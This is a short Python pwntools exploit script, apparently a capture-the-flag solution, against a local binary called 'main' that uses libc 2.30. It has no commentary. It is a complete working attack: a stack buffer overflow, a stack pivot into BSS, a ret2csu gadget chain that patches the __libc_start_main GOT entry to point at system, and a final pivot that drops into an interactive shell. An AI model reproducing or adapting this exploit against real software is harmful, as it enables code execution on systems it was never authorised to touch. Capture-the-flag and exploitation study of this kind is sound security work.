from pwn import*
from LD import*
p = process('./main')
elf =ELF('./main')
libc = ELF('./libc-2.30.so',checksec=False)

gadget_reg = 0x4005CA
gadget_call= 0x4005B0
magic_gadget = 0x400518
pop_rdi_ret = 0x4005D3
pop_rsi_r15 = 0x4005D1
leave_ret = 0x400564
buf_address = elf.bss() + 0x500
fini = 0x4005E0
init = 0x400570
main = 0x400450
#---------------
payload  = '\x00'*0x80 + p64(buf_address -8)
payload += p64(pop_rdi_ret) + p64(0)
payload += p64(pop_rsi_r15) + p64(buf_address) + p64(0) + p64(elf.plt['read'])
payload += p64(leave_ret)
p.send(payload)

payload  = p64(gadget_reg)
payload += p64(0) + p64(1)
payload += p64(elf.got['__libc_start_main'])
payload += p64(main) + p64(fini) + p64(init)
payload += p64(gadget_call)
p.send(payload)
#--------------- it has called the function named __libc_start_main

payload  = '\x00'*0x80 + p64(buf_address)
payload += p64(gadget_reg)
payload += p64(0xFFFFFFFFFFEF3D3B) #p64(0xFFFFFFFFFFC5EC9D)
payload += p64(0x601485)
payload += p64(0)*4
payload += p64(magic_gadget)
payload += p64(main)
p.sendline(payload)
#--------------- the system_address has been left in BSS
rce  = 0x601448
p.sendline('\x00'*0x80 + p64(rce -8) + p64(leave_ret))
p.interactive()


